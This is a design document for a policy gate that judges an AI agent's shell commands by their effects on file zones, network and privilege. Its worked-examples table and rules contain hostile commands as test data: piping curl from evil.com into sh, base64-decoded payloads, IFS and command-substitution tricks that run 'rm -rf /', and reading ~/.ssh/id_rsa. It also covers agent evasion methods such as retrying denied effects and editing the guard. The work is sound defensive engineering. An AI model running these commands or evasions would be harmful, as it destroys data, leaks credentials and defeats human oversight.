# Effects, zones and rules

The grammar in `compiler/grammar.md` decides what we can parse. This file decides what we allow. It is the design we agreed to write before `compiler/policy.py` exists, and it is a draft for both of us to argue with, not a finished specification.

The guiding choice is that **rules are written over effects, not over command names**. A rule that says "`rm` is forbidden" is defeated by `find . -delete`, by `python -c "import shutil; shutil.rmtree('.')"`, and by `mv x /dev/null`. A rule that says "deleting files outside the workspace is forbidden" covers all three, and covers the fourth one we have not thought of yet. This is what `docs/related-work.md` identifies as the gap: bashguard's `ActionType` enum classifies what a command *is*, while we want to compute what it would *touch*.

## 1. Effects

An effect is one thing a command would do, extracted from the AST. A command usually produces several.

```
Effect(kind, target, resolution, origin)
```

**`kind`** is one of:

| Kind | Meaning |
|---|---|
| `READ` | reads a file's contents |
| `WRITE` | creates or truncates a file |
| `APPEND` | adds to a file without truncating |
| `DELETE` | removes a file or directory |
| `MOVE` | renames, which is a `DELETE` of the source plus a `WRITE` of the destination |
| `CHDIR` | changes the session's working directory |
| `EXEC` | runs a program |
| `INTERPRET` | runs code supplied inline or on stdin, rather than a program by name |
| `NET_OUT` | opens an outbound connection |
| `NET_LISTEN` | binds a port |
| `PRIV_CHANGE` | changes permissions, ownership, or escalates privilege |
| `ENV_MUTATE` | changes a variable that affects how later words are interpreted |
| `SIGNAL` | sends a signal to a process |
| `UNKNOWN` | the command head is not in our knowledge table |

`MOVE` decomposing into two effects, and `INTERPRET` being distinct from `EXEC`, are both deliberate. `EXEC` of `python` is ordinary; `INTERPRET` with `python -c` means the real program is an argument we would have to parse in another language, which we cannot, so it is unresolved by construction.

**`target`** is a `Path`, a `Host`, a file descriptor, a process, or `None`.

**`resolution`** has three values, and this field rather than the kind is what most denials turn on:

| Value | Meaning | Example |
|---|---|---|
| `KNOWN(path)` | we can name every path the effect touches | `rm build/out.o` |
| `BOUNDED(dir)` | we cannot name the paths, but every one of them is at or under `dir` | `rm *`, `rm -rf build`, `find . -delete` |
| `UNKNOWN(reason)` | we cannot even bound them | `rm $UNTRACKED`, `rm $(cat list)` |

`BOUNDED` is computed as the **longest known directory prefix** of the word: resolve parts left to right, and at the first part whose value is unknown, take the directory prefix of the text resolved so far. `/var/log/$X` is `BOUNDED(/var/log)`; `$HOME/x` with `HOME` untracked is `UNKNOWN`, because nothing is resolved before the unknown part; `*` is `BOUNDED(cwd)`, because a glob expands within one directory and cannot escape it. For a command head, the bound comes from the knowledge table entry rather than from a word — `find . -delete` is `BOUNDED(.)` because that is what `find` does with a start directory.

The reason for three values and not two is in §5 under R2. In one line: the policy never needs a filename, it needs the region, so throwing away the region is what used to force us into choosing between denying `rm -rf build` and allowing `find / -delete`.

**`origin`** is the AST node, so every verdict can point at the part of the command that caused it.

### Which effects come from where

Three sources, in order of reliability.

Redirections are exact: the grammar tells us `> f` is a `WRITE` to `f`, `>> f` an `APPEND`, `< f` a `READ`, `>| f` a `WRITE` that overrides noclobber. No knowledge table needed, which is why cc-bash-guard makes redirection shape a first-class matcher.

Command heads need a knowledge table mapping a program to the effects it has, given its arguments. This is the part that will never be complete, and the honest response is that a head we do not know produces a single `UNKNOWN` effect rather than nothing. CARE classifies about 250 heads; we should start with perhaps forty that cover real agent traffic (`ls`, `cat`, `grep`, `find`, `sed`, `awk`, `head`, `tail`, `wc`, `sort`, `cp`, `mv`, `rm`, `mkdir`, `touch`, `chmod`, `chown`, `cd`, `pwd`, `git`, `python`, `node`, `npm`, `pip`, `curl`, `wget`, `ssh`, `scp`, `tar`, `zip`, `dd`, `echo`, `printf`, `which`, `env`, `export`, `kill`, `ps`, `docker`, `make`, `pytest`) and grow it from the benign corpus rather than from imagination.

Structure gives us effects no single head would: a pipe into a shell is an `INTERPRET`, `$(...)` in a command-name position is an `EXEC` of something unknown, an `ASSIGNMENT_WORD` on `IFS` or `PATH` is an `ENV_MUTATE` that changes the meaning of everything after it.

## 2. Zones

A path on its own means little; what matters is the region it falls in. Zones are resolved against session state, not against the raw text.

| Zone | Definition |
|---|---|
| `WORKSPACE` | inside the project root the gate was started with |
| `HOME` | under the user's home, outside the workspace |
| `SECRET` | credential-bearing: `~/.ssh`, `~/.aws`, `~/.kube`, `.env`, `~/.netrc`, keyrings |
| `SYSTEM` | `/etc`, `/usr`, `/bin`, `/boot`, `/var`, `/sys`, `/proc` |
| `DEVICE` | `/dev`, with `/dev/null`, `/dev/stdout`, `/dev/stderr` carved out as benign |
| `TEMP` | `/tmp` and the session's own scratch directory |
| `OUTSIDE` | anywhere else, including anything reached by `..` out of the workspace |

### The zone of a bounded set

A `KNOWN` target falls in exactly one zone. A `BOUNDED(dir)` target covers a whole subtree, so it falls in **every zone that subtree contains**, and the policy must decide the effect once for each of those zones and keep the strictest verdict. Getting this backwards is a bypass rather than a cosmetic error.

There is deliberately no severity order on zones themselves, and an earlier version of this section was wrong to describe one. Whether a zone is dangerous depends on what is done there: reading `SYSTEM` is allowed while writing it is denied, so no single ranking of zones can say which of two is worse. The order lives on verdicts, `ALLOW < ESCALATE < DENY`, and the policy computes a verdict for each (kind, zone) pair the target touches and takes their join. This is how `compiler/types.py` declares `Zone`.

The case that makes it concrete: `BOUNDED(~)` looks like `HOME`, but `~/.ssh` is under it, so the set includes `SECRET` and a read of it must be denied. That is what stops `grep -r password ~` and `rm -rf ~/*`. Operationally: the zones a bounded set touches are the zone of `dir` itself plus the zone of every zone root at or under `dir`. Since the zone roots are a short fixed list, finding them is a loop over that list asking whether each is a descendant of `dir`; the policy then decides the effect in each of those zones and takes the strictest result.

**Containment is textual, not symlink-aware.** `BOUNDED(dir)` claims that every path *as written* lies under `dir`; it does not claim the inodes do, because a symlink inside `dir` can point anywhere and we do not touch the filesystem during analysis. That is a real limit and it belongs in the threat model's residual risks beside the time-of-check gap, not hidden here.

CARE's read/write asymmetry is worth copying exactly: reading `/etc/os-release` is routine and should not be blocked, while appending to `/etc/profile` is persistence. So zone alone never decides; the pair (kind, zone) does.

## 3. Verdicts

Three, with a total order:

```
ALLOW  <  ESCALATE  <  DENY
```

Every stage may raise a verdict and none may lower it. This single rule is what keeps the system from being argued out of a denial: the policy can tighten the compiler, the classifier can tighten the policy, a project-local config can tighten the defaults, and nothing can go the other way. bashguard calls this ratcheting; CARE's result where the LLM judge made realised harm worse by flipping warn cases to allow is the empirical argument for it.

`ESCALATE` means a human is asked. It is not a soft allow, and the gate must not auto-resolve it when no human is present: with no one to ask, `ESCALATE` becomes `DENY`.

We also need cc-bash-guard's fourth value internally, **`ABSTAIN`**, meaning no rule had an opinion. Abstention is not permission. When every rule abstains the result is `ESCALATE`, because a command whose effects we could not place is a command we do not understand.

## 4. Session state, and the `cd desktop` problem

This is where we differ from everything in the related work, which is stateless per command.

Consider a policy that confines the agent to the workspace, and this sequence:

```
cd ~/Desktop          # a CHDIR effect, target HOME zone
cat notes.txt         # a READ of a relative path
```

Judged in isolation the second command reads `notes.txt`, which looks like a workspace file and is not. Only the session's working directory makes `notes.txt` resolve to `~/Desktop/notes.txt` in the `HOME` zone. CARE states that its mediation is stateless and that each decision is made over a single command in isolation, so this sequence is invisible to it; the same holds for a rule set over command strings.

So the gate keeps a small session state, and it is part of the design rather than an optimisation:

- **Working directory**, updated by every allowed `CHDIR`, used to resolve every relative path. A `CHDIR` to a zone the policy forbids is itself denied, which is the direct answer to the example: `cd ~/Desktop` is a `CHDIR` whose target is outside `WORKSPACE`, and the rule fires on the `cd`, not two commands later.
- **Tracked variables**, those assigned by `ASSIGNMENT_WORD` to literal resolved values, so that `D=/etc` then `cat $D/passwd` resolves. A variable assigned from anything we cannot resolve is recorded as `UNKNOWN` for the rest of the session, and is never guessed.
- **Denied-effect history**, the effects that were refused recently, which is what the NLI classifier compares a new command against. This is our answer to the verifier tax.

State makes us stricter, not more permissive: we track the working directory so that relative paths can be resolved, and a path we cannot resolve is bounded if we can name its region and `UNKNOWN` otherwise.

## 5. The rules

Ordered by precedence, highest first. Each has an id so a verdict can cite it and a regression test can name it.

**R1 — unparseable.** A command the grammar does not derive is `DENY`, citing the construct. No analysis of an unparseable command is attempted, and no fallback to string matching is permitted.

**R2 — unbounded destructive target.** An effect of kind `DELETE`, `WRITE`, `APPEND`, `MOVE` or `PRIV_CHANGE` whose target is `UNKNOWN` is `DENY`: with no bound there is no region, with no region there is no zone, and nothing can be shown about it. An `UNKNOWN` target on a `READ` is `ESCALATE` rather than `DENY`, because reads are recoverable.

A `BOUNDED` target does **not** fire R2. It goes to R4 like any other, carrying the joined zone of its subtree. This is the correction to the earlier two-valued design, and it is the rule that decides a large share of real agent traffic, so the reasoning is worth stating in full.

Under two values, `rm *`, `rm -rf build` and `find . -type f -delete` were a single category, and every way of treating that category was wrong. Denying it rejects three commands agents run constantly — over-refusal is the limitation the AgentGuard paper names as its own primary one, and CARE's headline claim is a 0.91% false-positive rate, so this is the axis the field is judged on. Allowing it permits `find / -delete`. There was no third option because the design had discarded the only fact that separates the cases.

With three values each lands where it should, and the zone does all the work: `rm -rf build` is `BOUNDED(workspace/build)`, inside the workspace, allowed. `rm *` is `BOUNDED(cwd)`, allowed when the working directory is in the workspace and denied the moment it is not. `find / -delete` is `BOUNDED(/)`, whose join covers `SYSTEM`, denied. `rm -rf ~/*` is `BOUNDED(~)`, whose join includes `SECRET`, denied. `rm $(cat list)` is `UNKNOWN`, denied by this rule.

Allowing deletion inside the workspace is not a concession we are making reluctantly; it is already what `docs/threat-model.md` says we do not defend against, since the agent is there to change the workspace and an agent that wrecks it is a correctness problem rather than a containment breach. Three-valued resolution is what makes the implementation match the claim we published.

**R3 — interpreter handoff.** Any `INTERPRET` effect is `DENY` unless the inline code is itself a shell command that we can parse and that passes policy recursively. This covers `sh -c '...'`, `eval`, `source`, `bash <<<"..."`, and any pipe whose right-hand side is a shell. `python -c`, `node -e`, `perl -e` and `awk` programs are `DENY` outright, since we do not have parsers for those languages and will not pretend to.

**R4 — path containment.** `WRITE`, `APPEND`, `DELETE`, `MOVE` outside `WORKSPACE` and `TEMP` is `DENY`. `READ` of `SECRET` is `DENY`. `READ` of `SYSTEM` is `ALLOW`. `CHDIR` outside `WORKSPACE` is `DENY` under a confining policy and `ESCALATE` otherwise. `DEVICE` writes are `DENY` except to the carved-out benign devices.

**R5 — privilege.** Any `PRIV_CHANGE` is `DENY`: `sudo`, `su`, `doas`, `chmod` granting execute or setuid, `chown`. There is no benign agent use that we need to support, and this is where the read-only-file circumvention reported in the literature starts.

**R6 — network.** `NET_OUT` to a host not on the allowlist is `ESCALATE`. `NET_LISTEN` is `DENY`. A `NET_OUT` in the same pipeline or command list as a `READ` of `SECRET` is `DENY` as exfiltration, which is the one rule that must look at effect *combinations* rather than single effects.

**R7 — obfuscation.** A decode step (`base64 -d`, `xxd -r`, `openssl enc -d`, `uudecode`) feeding an `EXEC` or `INTERPRET` is `DENY`. An `ENV_MUTATE` of `IFS`, `PATH`, `LD_PRELOAD` or `LD_LIBRARY_PATH` is `DENY`. A `CMD_SUBST` in a command-name position is `DENY`. Nesting depth of command substitution above one is `ESCALATE`. These come straight from bashguard's evasion rules and CARE's structural indicators, and they are the cheapest high-value rules we can write.

**R8 — self-protection.** Any `WRITE`, `APPEND`, `DELETE` or `MOVE` whose target is the gate's own code, its policy files, or its logs is `DENY`. A guard the agent can edit is not a guard; this is the non-bypassability requirement from *Red-Teaming the Agentic Red-Team*.

**R9 — retry of a denied effect.** A command whose effects are equivalent to an effect denied earlier in the session is `DENY`, and the NLI classifier's judgement feeds this rule. "Equivalent" needs defining precisely and is a research question in its own right: same kind and same target is easy, same kind and same zone is probably right, and same intent by different means is what the classifier is actually for.

**R10 — unknown head.** A command whose head is not in the knowledge table yields an `UNKNOWN` effect and `ESCALATE`. Never `ALLOW`: an unknown program is an unknown effect set. The rate at which R10 fires on the benign corpus is a direct measure of how incomplete our knowledge table is, and is worth reporting in the paper.

Default when every rule abstains: `ESCALATE`.

## 6. Shape of a rule file

We agreed in `docs/decisions.md` that writing our own small policy language is better coursework than reading YAML, and the survey notes that the only policy languages in the field are AgentSpec's and Agent-C's DSLs, so a DSL is defensible. A sketch, to argue about:

```
policy "workspace-confined" {
  workspace "/home/youssef/project"
  allow_hosts ["pypi.org", "registry.npmjs.org", "github.com"]

  deny    delete | write | append | move  where zone not in [workspace, temp]
  deny    read                            where zone == secret
  allow   read                            where zone == system
  deny    chdir                           where zone != workspace

  deny    any    where target unknown and kind in [delete, write, append, move, priv_change]
  escalate read  where target unknown

  deny    interpret
  deny    priv_change
  deny    net_listen
  escalate net_out where host not in allow_hosts
  deny    net_out where pipeline reads zone secret
}
```

This is still a sketch, and the interesting design questions are deliberately unanswered: how a rule refers to combinations across a pipeline (the exfiltration rule), whether rule order or specificity decides conflicts, and how the `workspace` root is bound. Writing a lexer and parser for this language is a second, small compiler, which is a nice symmetry for the report.

Two features of cc-bash-guard we should copy whatever syntax we pick. Every rule carries its own test cases, listing commands that must come out allow, escalate, deny or abstain, and a `verify` step runs them and refuses to build if a rule is too broad. And overly broad allow rules are rejected by the verifier, in particular any allow for an interpreter.

## 7. Worked examples

How the pieces combine, as a first set of regression tests:

| Command | Effects | Rule | Verdict |
|---|---|---|---|
| `ls -la` | `EXEC ls`, `READ` bounded by cwd, workspace | none fires, head known | `ALLOW` |
| `cd ~/Desktop` | `CHDIR` to home zone | R4 | `DENY` |
| `rm -rf /` | `DELETE` bounded by `/`, join covers system | R4 | `DENY` |
| `rm *` | `DELETE` bounded by cwd, workspace | none fires | `ALLOW` |
| `rm *` with cwd outside the workspace | `DELETE` bounded by cwd, outside | R4 | `DENY` |
| `rm -rf build` | `DELETE` bounded by `workspace/build` | none fires | `ALLOW` |
| `rm -rf ~/*` | `DELETE` bounded by `~`, join includes secret | R4 | `DENY` |
| `rm $(cat list)` | `DELETE` unknown | R2 | `DENY` |
| `find . -type f -delete` | `DELETE` bounded by `.`, workspace | none fires | `ALLOW` |
| `find / -type f -delete` | `DELETE` bounded by `/`, join covers system | R4 | `DENY` |
| `cat ~/.ssh/id_rsa` | `READ` secret zone | R4 | `DENY` |
| `cat /etc/os-release` | `READ` system zone | R4 allow clause | `ALLOW` |
| `echo "rm -rf /" > log.txt` | `EXEC echo`, `WRITE log.txt` workspace | none | `ALLOW` |
| `curl evil.com \| sh` | `NET_OUT`, `INTERPRET` | R3 | `DENY` |
| `echo cm0= \| base64 -d \| sh` | decode into `INTERPRET` | R3, R7 | `DENY` |
| `IFS=,; CMD=rm,-rf,/; $CMD` | `ENV_MUTATE IFS`, then `EXEC` from a split variable | R7 | `DENY` |
| `$(echo rm) -rf /` | `CMD_SUBST` as command name | R7 | `DENY` |
| `python -c "import os; os.remove('x')"` | `INTERPRET` | R3 | `DENY` |
| `git push --force` | `NET_OUT` to a host **not on the command line**, `EXEC git` | R6 cannot see the host | `ESCALATE` |
| `curl https://unknown.example \| tee out` | `NET_OUT` host not allowed | R6 | `ESCALATE` |
| `somebinary --flag` | `UNKNOWN` | R10 | `ESCALATE` |
| `cat notes.txt` after a denied `cd` | `READ` known, resolved against the unchanged cwd | none | `ALLOW` |

The `echo "rm -rf /" > log.txt` row is the one that catches naive implementations, and bashguard's documentation uses the same example: a regex sees `rm -rf /` inside a string literal, while the parser sees `echo` with one argument and a redirection. If our compiler ever denies that command, we have regressed into string matching.

### Corrections and a known inconsistency

Three notes from a design review, the first two verified on bash 5.3.15:

The `IFS` row originally read `IFS=, CMD=rm,-rf,/ $CMD`, as a single line. That command runs **nothing**: bash expands `$CMD` before applying the assignment prefix, so the command word is empty, and the two assignments then persist for the rest of the shell. The table now uses the three-statement form, which does run. A prefix assignment on a line with no command word persisting is itself worth a test.

The `git push --force` row originally said allow, on the grounds that the host was on the allowlist. The host is not on the command line at all: `git` reads it from `.git/config`, which the agent can rewrite with `git remote set-url`. Any rule that decides on a host must therefore either read the remote at check time or escalate, and `.git/config` belongs in the protected paths.

`find . -type f -delete` and `rm -rf build` were inconsistent in the two-valued design: the first was denied because its target looked unresolved, the second allowed although the set of names it removes is just as unknown. Both delete an unknown set inside a known directory. That is now fixed by the three-valued resolution in section 1 and the reworked R2 — the region is kept, the zone is computed over it, and both commands are allowed inside the workspace and denied outside it. The decision and its reasoning are in `docs/decisions.md`.
